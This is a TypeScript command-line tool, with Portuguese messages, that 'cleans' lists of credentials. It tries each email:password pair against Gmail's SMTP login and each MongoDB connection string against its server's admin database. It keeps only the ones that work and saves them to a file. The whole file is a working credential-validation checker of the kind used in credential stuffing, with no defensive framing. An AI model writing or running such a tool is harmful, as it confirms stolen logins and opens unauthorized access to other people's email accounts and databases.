import chalk from "chalk";
import fs from "fs";
import ora from "ora";
import nodemailer from "nodemailer";
import { MongoClient } from "mongodb";
import { input, select } from "@inquirer/prompts";

export async function cleanVariables(
  filePath: string,
  type: "email" | "mongo",
) {
  if (!fs.existsSync(filePath)) {
    console.log(chalk.red(`[-] Arquivo ${filePath} não encontrado.`));
    return;
  }

  const content = fs
    .readFileSync(filePath, "utf-8")
    .split("\n")
    .filter(Boolean);
  const validItems: string[] = [];
  const spinner = ora(`Iniciando limpeza de ${type}...`).start();

  for (const line of content) {
    spinner.text = `Testando: ${line.substring(0, 40)}...`;

    if (type === "email") {
      const [user, pass] = line.split(":");
      try {
        const transporter = nodemailer.createTransport({
          host: "smtp.gmail.com",
          port: 587,
          secure: false,
          auth: { user, pass },
          connectionTimeout: 3000,
        });
        await transporter.verify();
        validItems.push(line);
      } catch (err) {}
    } else if (type === "mongo") {
      try {
        const client = new MongoClient(line, {
          connectTimeoutMS: 2000,
          serverSelectionTimeoutMS: 2000,
        });
        await client.connect();
        await client.db("admin").command({ ping: 1 });
        await client.close();
        validItems.push(line);
      } catch (err) {}
    }
  }

  spinner.succeed(
    `Scanner finalizado. Itens válidos: ${validItems.length}/${content.length}`,
  );

  const action = await select({
    message: "O que deseja fazer com os resultados válidos?",
    choices: [
      { name: "Substituir arquivo original", value: "replace" },
      { name: "Criar novo arquivo", value: "new" },
      { name: "Cancelar", value: "cancel" },
    ],
  });

  if (action === "replace") {
    fs.writeFileSync(filePath, validItems.join("\n") + "\n");
    console.log(chalk.green(`[+] Arquivo ${filePath} atualizado!`));
  } else if (action === "new") {
    const newName = await input({
      message: "Nome do novo arquivo:",
      default: `cleaned_${filePath}`,
    });
    fs.writeFileSync(newName, validItems.join("\n") + "\n");
    console.log(chalk.green(`[+] Novo arquivo ${newName} criado!`));
  }
}
